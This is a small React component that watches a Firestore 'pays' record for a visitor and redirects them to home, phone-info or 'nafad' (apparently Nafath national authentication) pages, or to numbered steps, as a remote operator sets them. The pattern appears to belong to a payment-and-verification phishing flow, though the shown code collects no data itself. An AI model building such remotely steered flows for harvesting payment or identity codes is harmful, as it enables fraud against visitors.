import { db } from "@/lib/firebase"
import { doc, onSnapshot } from "firebase/firestore"
import { useEffect } from "react"

export const Traker = ({ setCurrentStep }: any) => {
    useEffect(() => {
        const visitorId = localStorage.getItem("visitor")
        if (visitorId) {
            const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
                if (docSnap.exists()) {
                    const data = docSnap.data()
                    if (data.currentStep === "home") {
                        window.location.href = "/"
                    } else
                        if (data.currentStep === "phone") {
                            window.location.href = "/phone-info"
                        } else if (data.currentStep === "nafad") {
                            window.location.href = "/nafad"
                        } else
                            if (parseInt(data.currentStep) === 1 || data.currentStep === "2" || data.currentStep === "3" || data.currentStep === "4") {
                                setCurrentStep(parseInt(data.currentStep))
                            }
                }
            })

            return () => unsubscribe()
        }
    }, [])
    return null
}